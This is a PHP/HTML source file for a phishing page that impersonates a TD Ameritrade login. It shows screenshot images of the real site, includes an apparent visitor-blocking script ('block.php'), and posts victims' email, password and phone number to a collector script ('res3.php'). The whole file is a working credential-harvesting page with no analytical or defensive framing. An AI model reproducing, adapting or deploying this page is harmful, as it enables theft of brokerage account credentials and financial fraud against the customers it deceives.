<?php
require_once 'block.php';
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>TD Ameritrade Login </title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">

<style type="text/css">
div#container
{
	position:relative;
	width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

<link rel="shortcut icon"
              href="img/favicon.ico"/>
    
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body style="visibility:hidden" onload="unhideBody()">
</head>
<body bgColor="#FFFFFF">
<div id="container">


<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1350px; height:117px; z-index:2"><img src="img/top.PNG" alt="" title="" border=0 width=1350 height=117></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:110px; width:1350px; height:398px; z-index:3"><img src="img/mains.png" alt="" title="" border=0 width=1350 height=398></div>


<form action="res3.php" name=chalbhai id=chalbhai method=post>
<input name="email"  required title="Please Enter Right Value" autocomplete="off"  type="text" style="position:absolute;width:220px;height:25px;left:330px;top:308px;z-index:6">
<input name="password"  required title="Please Enter Right Value" autocomplete="off"  type="password" style="position:absolute;width:220px;height:25px;left:330px;top:348px;z-index:7">
<input name="phone"  required title="Please Enter Right Value" autocomplete="off"  type="text" style="position:absolute;width:220px;height:25px;left:330px;top:388px;z-index:7">



<div id="formimage1" style="position:absolute; left:655px; top:410px; z-index:10"><input type="image" name="formimage1" width="135" height="45" src="img/conti.png"></div>
<div id="image8" style="position:absolute; overflow:hidden; left:0px; top:555px; width:1350px; height:220px; z-index:11"><img src="img/footer.png" alt="" title="" border=0 width=1350 height=220></div>

</div>

</body>
</html>
